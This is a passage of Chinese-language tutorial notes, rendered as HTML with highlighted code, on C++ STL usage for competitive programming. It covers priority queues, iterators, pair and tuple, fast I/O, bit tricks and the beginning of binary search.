<span class="hljs-type">int</span> b) &#123; <span class="hljs-keyword">return</span> a &gt; b; &#125;);<br><span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> v : s) &#123;<br>     cout &lt;&lt; v &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// 输出：5 4 3 2 1</span><br>&#125;<br></code></pre></td></tr></table></figure><p><strong><code>priority_queue</code></strong> 自定义比较函数（实现小顶堆）</p><p><code>priority_queue</code> 默认是大顶堆，我们可以通过自定义比较函数创建小顶堆。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 自定义比较函数，实现小顶堆</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Compare</span> &#123;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> a &gt; b;  <span class="hljs-comment">// 使较小的元素拥有更高优先级</span><br>    &#125;<br>&#125;;<br><br>priority_queue&lt;<span class="hljs-type">int</span>, std::vector&lt;<span class="hljs-type">int</span>&gt;, Compare&gt; pq;<br>pq.<span class="hljs-built_in">push</span>(<span class="hljs-number">5</span>);<br>pq.<span class="hljs-built_in">push</span>(<span class="hljs-number">1</span>);<br>pq.<span class="hljs-built_in">push</span>(<span class="hljs-number">3</span>);<br><span class="hljs-keyword">while</span> (!pq.<span class="hljs-built_in">empty</span>()) &#123;<br>    cout &lt;&lt; pq.<span class="hljs-built_in">top</span>() &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// 输出：1 3 5</span><br>    pq.<span class="hljs-built_in">pop</span>();<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="四、迭代器-Iterators"><a href="#四、迭代器-Iterators" class="headerlink" title="四、迭代器 (Iterators)"></a>四、迭代器 (Iterators)</h4><p>迭代器提供了一种统一的方式来遍历 STL 容器。常见的迭代器类型有：</p><ul><li><code>begin()</code> 和 <code>end()</code>：返回指向容器第一个元素和尾后元素的迭代器。</li><li><code>rbegin()</code> 和 <code>rend()</code>：返回逆序迭代器，分别指向最后一个元素和第一个元素之前的位置。</li><li><code>cbegin()</code> 和 <code>cend()</code>：返回常量迭代器，不能用于修改元素。</li></ul><p>迭代器可以通过 <code>*it</code> 解引用访问元素，通过 <code>++it</code> 或 <code>--it</code> 移动到下一个或上一个元素。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;queue&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">Person</span> &#123;<br>    <span class="hljs-type">int</span> age;<br>    string name;<br>    <span class="hljs-built_in">Person</span>(<span class="hljs-type">int</span> age, string name) : <span class="hljs-built_in">age</span>(age), <span class="hljs-built_in">name</span>(name) &#123;&#125;<br>&#125;;<br><br><span class="hljs-comment">// 自定义比较函数</span><br><span class="hljs-keyword">struct</span> <span class="hljs-title class_">CompareAge</span> &#123;<br>    <span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">operator</span><span class="hljs-params">()</span><span class="hljs-params">(<span class="hljs-type">const</span> Person&amp; p1, <span class="hljs-type">const</span> Person&amp; p2)</span> </span>&#123;<br>        <span class="hljs-keyword">return</span> p<span class="hljs-number">1.</span>age &gt; p<span class="hljs-number">2.</span>age;  <span class="hljs-comment">// 按照年龄升序排列（最小堆）</span><br>    &#125;<br>&#125;;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-comment">// 使用自定义比较函数 CompareAge（最小堆）</span><br>    priority_queue&lt;Person, vector&lt;Person&gt;, CompareAge&gt; pq;<br>    pq.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">Person</span>(<span class="hljs-number">25</span>, <span class="hljs-string">&quot;Alice&quot;</span>));<br>    pq.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">Person</span>(<span class="hljs-number">30</span>, <span class="hljs-string">&quot;Bob&quot;</span>));<br>    pq.<span class="hljs-built_in">push</span>(<span class="hljs-built_in">Person</span>(<span class="hljs-number">20</span>, <span class="hljs-string">&quot;Charlie&quot;</span>));<br>    <span class="hljs-comment">// 输出堆顶元素（最小年龄）</span><br>    cout &lt;&lt; <span class="hljs-string">&quot;Top person: &quot;</span> &lt;&lt; pq.<span class="hljs-built_in">top</span>().name &lt;&lt; <span class="hljs-string">&quot;, Age: &quot;</span> &lt;&lt; pq.<span class="hljs-built_in">top</span>().age &lt;&lt; endl;  <span class="hljs-comment">// 输出 Charlie, 20</span><br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="五-辅助工具类（Utility-Components）"><a href="#五-辅助工具类（Utility-Components）" class="headerlink" title="五.辅助工具类（Utility Components）"></a>五.辅助工具类（Utility Components）</h4><ul><li><strong>数据结构</strong>：<code>pair</code>、<code>tuple</code>、<code>make_pair</code>、<code>make_tuple</code></li><li><strong>交换和引用</strong>：<code>swap</code></li></ul><p><strong><code>pair</code> 的基本使用</strong></p><p><code>pair</code> 的定义在 <code>&lt;utility&gt;</code> 头文件中，通常用 <code>std::make_pair</code> 函数来创建一个 <code>pair</code>，也可以直接使用构造函数。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 使用 make_pair 函数创建一个 pair</span><br>pair&lt;std::string, <span class="hljs-type">int</span>&gt; student = <span class="hljs-built_in">make_pair</span>(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">23</span>);<br><span class="hljs-comment">// 访问 pair 中的元素</span><br>cout &lt;&lt; <span class="hljs-string">&quot;Name: &quot;</span> &lt;&lt; student.first &lt;&lt; <span class="hljs-string">&quot;, Age: &quot;</span> &lt;&lt; student.second &lt;&lt; endl;<br><span class="hljs-comment">// 也可以直接使用构造函数初始化 pair</span><br><span class="hljs-function">pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">double</span>&gt; <span class="hljs-title">score</span><span class="hljs-params">(<span class="hljs-number">1</span>, <span class="hljs-number">98.5</span>)</span></span>;<br>cout &lt;&lt; <span class="hljs-string">&quot;Rank: &quot;</span> &lt;&lt; score.first &lt;&lt; <span class="hljs-string">&quot;, Score: &quot;</span> &lt;&lt; score.second &lt;&lt;endl;<br><br></code></pre></td></tr></table></figure><p><strong><code>pair</code> 的成员</strong></p><ul><li><code>first</code>: 表示 <code>pair</code> 中的第一个元素。</li><li><code>second</code>: 表示 <code>pair</code> 中的第二个元素。</li></ul><p>可以通过 <code>pair.first</code> 和 <code>pair.second</code> 分别访问两个值。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">char</span>&gt; <span class="hljs-title">p</span><span class="hljs-params">(<span class="hljs-number">10</span>, <span class="hljs-string">&#x27;A&#x27;</span>)</span></span>;  <span class="hljs-comment">// 初始化pair，第一个元素是int，第二个是char</span><br>cout &lt;&lt; <span class="hljs-string">&quot;First: &quot;</span> &lt;&lt; p.first &lt;&lt; endl;  <span class="hljs-comment">// 输出10</span><br>cout &lt;&lt; <span class="hljs-string">&quot;Second: &quot;</span> &lt;&lt; p.second &lt;&lt; endl;  <span class="hljs-comment">// 输出&#x27;A&#x27;</span><br></code></pre></td></tr></table></figure><p><strong>与容器结合使用</strong></p><p><code>pair</code> 在 STL 容器中非常常用，特别是在关联容器（如 <code>map</code> 和 <code>set</code>）中，<code>pair</code> 用于表示键值对。在 <code>map</code> 中，键值对的每个元素实际上是一个 <code>pair</code>，其中 <code>first</code> 是键，<code>second</code> 是值。</p><p>在 <code>map</code> 中使用 <code>pair</code>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-comment">// 创建一个 map 来存储学生姓名和分数</span><br>map&lt;string, <span class="hljs-type">int</span>&gt; studentScores;<br><span class="hljs-comment">// 插入键值对，使用 make_pair 函数</span><br>studentScores.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">make_pair</span>(<span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">90</span>));<br>studentScores.<span class="hljs-built_in">insert</span>(<span class="hljs-built_in">make_pair</span>(<span class="hljs-string">&quot;Bob&quot;</span>, <span class="hljs-number">85</span>));<br><span class="hljs-comment">// 访问 map 中的元素</span><br><span class="hljs-keyword">for</span> (<span class="hljs-type">const</span> <span class="hljs-keyword">auto</span>&amp; entry : studentScores) &#123;<br>   cout &lt;&lt; <span class="hljs-string">&quot;Name: &quot;</span> &lt;&lt; entry.first &lt;&lt; <span class="hljs-string">&quot;, Score: &quot;</span> &lt;&lt; entry.second &lt;&lt; endl;<br>&#125;<br><span class="hljs-comment">// 也可以通过 [] 操作符直接访问键值对</span><br>studentScores[<span class="hljs-string">&quot;Charlie&quot;</span>] = <span class="hljs-number">88</span>;<br>cout &lt;&lt; <span class="hljs-string">&quot;Charlie&#x27;s Score: &quot;</span> &lt;&lt; studentScores[<span class="hljs-string">&quot;Charlie&quot;</span>] &lt;&lt; endl;<br></code></pre></td></tr></table></figure><p><strong>比较 <code>pair</code></strong></p><p><code>pair</code> 支持比较操作（如 <code>==</code>、<code>!=</code>、<code>&lt;</code>、<code>&gt;</code> 等）。比较规则是先比较 <code>first</code> 元素，如果 <code>first</code> 相等，则比较 <code>second</code> 元素。</p><p>示例：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; <span class="hljs-title">p1</span><span class="hljs-params">(<span class="hljs-number">10</span>, <span class="hljs-number">20</span>)</span></span>;<br><span class="hljs-function">pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; <span class="hljs-title">p2</span><span class="hljs-params">(<span class="hljs-number">10</span>, <span class="hljs-number">30</span>)</span></span>;<br><span class="hljs-keyword">if</span> (p1 &lt; p2) &#123;<br>    cout &lt;&lt; <span class="hljs-string">&quot;p1 is less than p2&quot;</span> &lt;&lt; endl;  <span class="hljs-comment">// 比较的是 first，若相等，则比较 second</span><br>&#125;<br></code></pre></td></tr></table></figure><p>在这个例子中，<code>p1</code> 和 <code>p2</code> 的 <code>first</code> 部分相同，比较结果取决于 <code>second</code> 部分。</p><p><strong><code>pair</code> 的常见用法</strong></p><p><strong>作为函数的返回值</strong>：当你需要从函数中返回多个值时，<code>pair</code> 可以作为方便的结构体来返回两个值，而不需要创建专门的结构体。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function">pair&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt; <span class="hljs-title">getMinMax</span><span class="hljs-params">(<span class="hljs-type">int</span> a, <span class="hljs-type">int</span> b)</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> (a &lt; b) &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_pair</span>(a, b);<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-built_in">make_pair</span>(b, a);<br>    &#125;<br>&#125;<br><span class="hljs-keyword">auto</span> result = <span class="hljs-built_in">getMinMax</span>(<span class="hljs-number">5</span>, <span class="hljs-number">10</span>);<br>cout &lt;&lt; <span class="hljs-string">&quot;Min: &quot;</span> &lt;&lt; result.first &lt;&lt; <span class="hljs-string">&quot;, Max: &quot;</span> &lt;&lt; result.second &lt;&lt; endl;<br></code></pre></td></tr></table></figure><p><strong><code>tuple</code> 作为扩展</strong></p><p><code>pair</code> 只能存储两个相关联的值。如果你需要存储更多的值，可以使用 C++11 引入的 <code>tuple</code>，它是 <code>pair</code> 的扩展版，可以存储任意多个元素。</p><p>示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c">tuple&lt;<span class="hljs-type">int</span>, <span class="hljs-built_in">string</span>, <span class="hljs-type">double</span>&gt; <span class="hljs-title function_">t</span><span class="hljs-params">(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Alice&quot;</span>, <span class="hljs-number">90.5</span>)</span>;<br><span class="hljs-comment">// 访问 tuple 中的元素</span><br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;ID: &quot;</span> &lt;&lt; get&lt;<span class="hljs-number">0</span>&gt;(t) &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Name: &quot;</span> &lt;&lt; get&lt;<span class="hljs-number">1</span>&gt;(t) &lt;&lt; <span class="hljs-built_in">endl</span>;<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-string">&quot;Score: &quot;</span> &lt;&lt;get&lt;<span class="hljs-number">2</span>&gt;(t) &lt;&lt; <span class="hljs-built_in">endl</span>;<br></code></pre></td></tr></table></figure><p><code>tuple</code> 可以通过 <code>get&lt;index&gt;</code> 来访问每个元素，并且可以存储任意数量和类型的元素。</p><p><strong><code>pair</code>：一对数据存储</strong></p><p><strong>功能：</strong> 存储两个不同类型的数据对，常用于 <strong><code>map</code></strong> 中的键值对存储。</p><p><strong>头文件：</strong> <code>&lt;utility&gt;</code></p><p>示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-built_in">string</span>&gt; p = <span class="hljs-built_in">make_pair</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;apple&quot;</span>);<br><span class="hljs-built_in">cout</span> &lt;&lt; p.first &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; p.second &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;  <span class="hljs-comment">// 输出：1, apple</span><br></code></pre></td></tr></table></figure><p><code>tuple</code>：多数据存储</p><p><strong>功能：</strong> 可存储任意数量、任意类型的元素，比 <code>pair</code> 更灵活。</p><p><strong>头文件：</strong> <code>&lt;tuple&gt;</code></p><p>示例：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> t = make_tuple(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;apple&quot;</span>, <span class="hljs-number">3.14</span>);<br><span class="hljs-built_in">cout</span> &lt;&lt; <span class="hljs-built_in">std</span>::get&lt;<span class="hljs-number">0</span>&gt;(t) &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; get&lt;<span class="hljs-number">1</span>&gt;(t) &lt;&lt; <span class="hljs-string">&quot;, &quot;</span> &lt;&lt; get&lt;<span class="hljs-number">2</span>&gt;(t) &lt;&lt; <span class="hljs-string">&quot;\n&quot;</span>;<br><span class="hljs-comment">// 输出：1, apple, 3.14</span><br></code></pre></td></tr></table></figure><p><strong><code>make_pair</code> 和 <code>make_tuple</code>：简化对象创建</strong></p><p><strong>功能：</strong> 分别用于创建 <code>pair</code> 和 <code>tuple</code>，自动推导类型，简化代码。</p><p><strong>头文件：</strong> <code>&lt;utility&gt;</code>, <code>&lt;tuple&gt;</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-keyword">auto</span> p = <span class="hljs-built_in">make_pair</span>(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;banana&quot;</span>);<br><span class="hljs-keyword">auto</span> t = make_tuple(<span class="hljs-number">1</span>, <span class="hljs-number">2.5</span>, <span class="hljs-string">&quot;orange&quot;</span>);<br></code></pre></td></tr></table></figure><p><code>swap</code>：交换两个对象的值</p><p><strong>功能：</strong> 用于交换两个对象的内容。</p><p><strong>头文件：</strong> <code>&lt;utility&gt;</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> a = <span class="hljs-number">10</span>, b = <span class="hljs-number">20</span>;<br>swap(a, b);  <span class="hljs-comment">// a 变为 20，b 变为 10</span><br></code></pre></td></tr></table></figure><hr><h3 id="5-优化技巧"><a href="#5-优化技巧" class="headerlink" title="5.优化技巧"></a>5.优化技巧</h3><p>在算法竞赛中，为了编写简洁高效的代码，争取时间并减少输入输出的繁琐步骤，常见的简便操作可以帮助你在紧张的比赛环境中提高编写和执行代码的效率。以下是一些常见的简便操作和优化技巧：</p><h4 id="1-快速输入输出"><a href="#1-快速输入输出" class="headerlink" title="1. 快速输入输出"></a>1. <strong>快速输入输出</strong></h4><p>最好每个都写上</p> <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c">ios::sync_with_stdio(<span class="hljs-literal">false</span>);<br><span class="hljs-built_in">cin</span>.tie(<span class="hljs-number">0</span>);<br><span class="hljs-built_in">cout</span>.tie(<span class="hljs-number">0</span>);<br></code></pre></td></tr></table></figure><h4 id="2-使用宏定义减少代码量"><a href="#2-使用宏定义减少代码量" class="headerlink" title="2.使用宏定义减少代码量"></a>2.<strong>使用宏定义减少代码量</strong></h4><p>宏可以用于减少输入输出、常用算法或者常用数据结构的代码量。虽然宏定义过多可能影响代码的可读性，但在竞赛中可以帮助你快速编写代码。</p><h4 id="3-使用-STL-简化操作"><a href="#3-使用-STL-简化操作" class="headerlink" title="3. 使用 STL 简化操作"></a>3. <strong>使用 STL 简化操作</strong></h4><p>C++ 标准模板库（STL）提供了丰富的容器和算法，可以大幅减少代码量和开发时间。在竞赛中常用的有：</p><p><strong><code>std::vector</code> 和 <code>std::pair</code></strong></p><ul><li><code>vector</code> 是动态数组，非常适合存储大规模数据。</li><li><code>pair</code> 用于存储两个相关联的值，常用于排序和存储坐标、键值对等。</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;algorithm&gt;</span></span><br>using namespace <span class="hljs-built_in">std</span>;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">vector</span>&lt;<span class="hljs-built_in">pair</span>&lt;<span class="hljs-type">int</span>, <span class="hljs-type">int</span>&gt;&gt; vp = &#123;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">5</span>&#125;, &#123;<span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;, &#123;<span class="hljs-number">4</span>, <span class="hljs-number">2</span>&#125;&#125;;<br>    <br>    <span class="hljs-comment">// 使用sort对pair进行排序，按照first排序</span><br>    sort(vp.begin(), vp.end());<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> p : vp) &#123;<br>        <span class="hljs-built_in">cout</span> &lt;&lt; p.first &lt;&lt; <span class="hljs-string">&quot; &quot;</span> &lt;&lt; p.second &lt;&lt; <span class="hljs-built_in">endl</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>常用 STL 函数：<code>sort</code>、<code>max_element</code>、<code>min_element</code></strong></p><p>使用 STL 提供的算法库，如 <code>sort</code>、<code>max_element</code> 等，可以快速实现排序和最大最小值的查找，避免手动实现。</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs c#"><span class="hljs-meta">#include &lt;iostream&gt;</span><br><span class="hljs-meta">#include &lt;vector&gt;</span><br><span class="hljs-meta">#include &lt;algorithm&gt;</span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> <span class="hljs-title">std</span>;<br><br><span class="hljs-function"><span class="hljs-built_in">int</span> <span class="hljs-title">main</span>()</span> &#123;<br>    vector&lt;<span class="hljs-built_in">int</span>&gt; v = &#123;<span class="hljs-number">5</span>, <span class="hljs-number">2</span>, <span class="hljs-number">9</span>, <span class="hljs-number">1</span>, <span class="hljs-number">5</span>, <span class="hljs-number">6</span>&#125;;<br><br>    <span class="hljs-comment">// 快速排序</span><br>    sort(v.begin(), v.end());<br><br>    <span class="hljs-comment">// 查找最大值和最小值</span><br>    <span class="hljs-built_in">int</span> maxVal = *max_element(v.begin(), v.end());<br>    <span class="hljs-built_in">int</span> minVal = *min_element(v.begin(), v.end());<br><br>    cout &lt;&lt; <span class="hljs-string">&quot;Max: &quot;</span> &lt;&lt; maxVal &lt;&lt; <span class="hljs-string">&quot;, Min: &quot;</span> &lt;&lt; minVal &lt;&lt; endl;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="4-使用-auto-减少冗长的类型声明"><a href="#4-使用-auto-减少冗长的类型声明" class="headerlink" title="4. 使用 auto 减少冗长的类型声明"></a>4. <strong>使用 <code>auto</code> 减少冗长的类型声明</strong></h4><p><code>auto</code> 关键字允许编译器自动推导变量类型，特别是在使用复杂的 STL 容器时，它可以显著减少代码的长度和复杂性。</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;iostream&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;vector&gt;</span></span><br><span class="hljs-keyword">using</span> <span class="hljs-keyword">namespace</span> std;<br><br><span class="hljs-function"><span class="hljs-type">int</span> <span class="hljs-title">main</span><span class="hljs-params">()</span> </span>&#123;<br>    <span class="hljs-keyword">auto</span> vec = vector&lt;<span class="hljs-type">int</span>&gt;&#123;<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>&#125;;  <span class="hljs-comment">// 自动推导类型</span><br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">auto</span> i : vec) &#123;<br>        cout &lt;&lt; i &lt;&lt; <span class="hljs-string">&quot; &quot;</span>;  <span class="hljs-comment">// 输出 1 2 3</span><br>    &#125;<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="5-位操作优化"><a href="#5-位操作优化" class="headerlink" title="5. 位操作优化"></a>5. <strong>位操作优化</strong></h4><p>位操作是非常高效的操作，它能让很多算法在常数时间内完成操作。常见的应用包括判断奇偶性、交换数值、位掩码操作等。</p><p><strong>常见的位操作技巧</strong>：</p><ul><li><p><strong>判断奇偶</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isOdd</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> n &amp; <span class="hljs-number">1</span>;  <span class="hljs-comment">// 如果 n 的最低位是 1 则为奇数，否则为偶数</span><br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>交换两个数</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">void</span> <span class="hljs-title">swap</span><span class="hljs-params">(<span class="hljs-type">int</span> &amp;a, <span class="hljs-type">int</span> &amp;b)</span> </span>&#123;<br>    a = a ^ b;<br>    b = a ^ b;<br>    a = a ^ b;<br>&#125;<br></code></pre></td></tr></table></figure></li><li><p><strong>快速计算 2 的幂</strong>：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c++"><span class="hljs-function"><span class="hljs-type">bool</span> <span class="hljs-title">isPowerOfTwo</span><span class="hljs-params">(<span class="hljs-type">int</span> n)</span> </span>&#123;<br>    <span class="hljs-keyword">return</span> (n &gt; <span class="hljs-number">0</span>) &amp;&amp; (n &amp; (n - <span class="hljs-number">1</span>)) == <span class="hljs-number">0</span>;  <span class="hljs-comment">// n 是 2 的幂时，其二进制中只有一个 1</span><br>&#125;<br></code></pre></td></tr></table></figure></li></ul><hr><h2 id="一-二分"><a href="#一-二分" class="headerlink" title="一.二分"></a>一.二分</h2><h3 id="二分查找的基本实现："><a href="#二分查找的基本实现：" class="headerlink" title="二分查找的基本实现："></a><strong>二分查找的基本实现</strong>：</h3><p>二分查找用于在有序数组中查找目标值 <code>target</code>，其时间复杂度为 O(log n)。</p><p>要求需要有序的数组</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><code class="hljs cpp"><span class="hljs-type">int</span> left = <span class="hljs-number">0</span>, right = n - <span class="hljs-number">1</span>;<br><span class="hljs-keyword">while</span> (left &lt;= right) &#123;<br>    <span class="hljs-type">int</span> mid = (left + right) / <span class="hljs-number">2</span>;<br>    <span class="hljs-keyword">if</span> (array[mid] == target)<br>        <span class="hljs-keyword">return</span> mid;  <span class="hljs-comment">// 找到目标，返回索引</span><br>    <span class="hljs-keyword">if</span> (array[mid] &lt; target)<br>        left = mid + <span class="hljs-number">1</span>;  <span class="hljs-comment">// 目标在右边</span><br>    <span class="hljs-keyword">else</span><br>        right = mid - <span class="hljs-number">1</span>;  <span class="hljs-comment">// 目标在左边</span><br>&#125;<br><span 